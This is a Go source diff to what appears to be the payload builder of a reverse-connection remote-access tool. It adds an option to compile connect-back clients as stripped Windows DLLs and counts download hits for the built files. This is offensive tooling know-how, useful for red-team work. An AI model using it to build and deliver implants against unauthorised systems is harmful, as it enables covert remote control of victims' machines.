@@ -23,6 +23,8 @@ type file struct {
 	Path      string
 	Goos      string
 	Goarch    string
+	FileType  string
+	Hits      int
 }
 
 var Autocomplete = trie.NewTrie()
@@ -36,7 +38,7 @@ var c sync.RWMutex
 var cache map[string]file = make(map[string]file) // random id to actual file path
 var cachePath string
 
-func Build(expiry time.Duration, goos, goarch, connectBackAdress, name string) (string, error) {
+func Build(expiry time.Duration, goos, goarch, connectBackAdress, name string, shared bool) (string, error) {
 	if !webserverOn {
 		return "", fmt.Errorf("Web server is not enabled.")
 	}
@@ -77,15 +79,34 @@ func Build(expiry time.Duration, goos, goarch, connectBackAdress, name string) (
 	f.Path = filepath.Join(cachePath, filename)
 	f.Timestamp = time.Now()
 	f.Expiry = expiry
+	f.FileType = "executable"
 
-	cmd := exec.Command("go", "build", fmt.Sprintf("-ldflags=-X main.destination=%s", connectBackAdress), "-o", f.Path, filepath.Join(projectRoot, "/cmd/client"))
+	buildArguments := []string{"build"}
+	if shared {
+		buildArguments = append(buildArguments, "-buildmode=c-shared")
+		f.FileType = "shared-object"
+		f.Path += ".dll"
+	}
+
+	buildArguments = append(buildArguments, fmt.Sprintf("-ldflags=-s -w -X main.destination=%s", connectBackAdress))
+	buildArguments = append(buildArguments, "-o", f.Path, filepath.Join(projectRoot, "/cmd/client"))
+
+	cmd := exec.Command("go", buildArguments...)
+
 	cmd.Env = append(cmd.Env, os.Environ()...)
 
 	if len(connectBack) != 0 {
 		cmd.Env = append(cmd.Env)
 	}
 
-	cmd.Env = append(cmd.Env, "CGO_ENABLED=0")
+	//Building a shared object on windows needs some extra beans
+	cgoOn := "0"
+	if shared && goos == "windows" {
+		cmd.Env = append(cmd.Env, "CC=x86_64-w64-mingw32-gcc")
+		cgoOn = "1"
+	}
+
+	cmd.Env = append(cmd.Env, "CGO_ENABLED="+cgoOn)
 
 	f.Goos = runtime.GOOS
 	if len(goos) > 0 {
@@ -126,6 +147,10 @@ func Get(key string) (file, error) {
 	if !ok {
 		return cacheEntry, errors.New("Unable to find cache entry: " + key)
 	}
+
+	cacheEntry.Hits++
+
+	cache[key] = cacheEntry
 
 	return cacheEntry, nil
 }
